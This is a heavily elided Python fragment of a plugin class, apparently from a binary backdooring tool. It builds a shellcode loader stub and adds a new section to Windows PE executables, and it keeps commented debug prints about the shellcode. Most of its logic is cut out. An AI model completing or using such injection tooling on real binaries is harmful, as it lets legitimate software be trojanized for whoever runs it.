...
class cfg_dll_loader_add_section:

    def __init__(self, BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """cfg_dll_loader_add_section"""
        self.description = """Places a stub in the text section, adds a section"""
    ...
    def main(self):
        ...
        #print(f"self.loader_resume_exe_offset: {self.loader_resume_exe_offset}")
        ...
        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<I", self.shellcode_len - len(self.flag)) + loader_tmp_back
        ...
        self.BDF.pe_object['loader_stub'] = loader_tmp_front + struct.pack("<Q", self.BDF.pe_object['PayloadNewSection'] - self.second_distance_from_payload_offset + 0x10) + loader_tmp_back
    ...
    def get_patch_instr(self):
        ...
        #print(f'loader stub len: {len(self.BDF.pe_object["loader_stub"])}, hash: {common.hashbytes("sha256", self.BDF.pe_object["loader_stub"])}')
        #print(f"completeShellcode @ patch_instr: {self.BDF.pe_object['completeShellcode']}")
